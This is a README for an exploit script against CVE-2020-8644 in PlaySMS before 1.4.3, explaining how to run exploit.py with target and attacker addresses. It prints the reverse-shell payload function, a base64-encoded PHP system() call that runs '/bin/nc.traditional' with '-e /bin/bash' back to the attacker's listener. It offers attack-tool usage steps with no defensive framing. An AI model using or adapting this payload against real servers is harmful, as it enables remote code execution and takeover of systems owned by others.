# CVE-2020-8644-PlaySMS-1.4
Python script to exploit PlaySMS before 1.4.3

## Execution

Open a port on your machine:

![Open port with nc](/img/nc.png)

And the execute exploit.py:

![Execution](/img/execution.png)

```
./exploit.py <target-ip> <target-port> <your-ip> <your-open-port>
```

## Changing the exploit

Tou may want to change the reverse shell created by exploit.py

To do this, you can change the function ```create_revshell_encoded``` on lines 14 to 19 of exploit.py:

```
def create_revshell_encoded(lhost,lport):
    # Change if you need
    revshell = "/*<?php /**/ system('/bin/nc.traditional "+lhost + " " + lport + " -e /bin/bash');"
    revshell_encoded = base64_encode(revshell)
    revshell_encoded = revshell_encoded.split('=')[0]
    return revshell_encoded
```

This code was developed to exploit a specific scenario where the target machine had ```/bin/nc.traditional``` available.
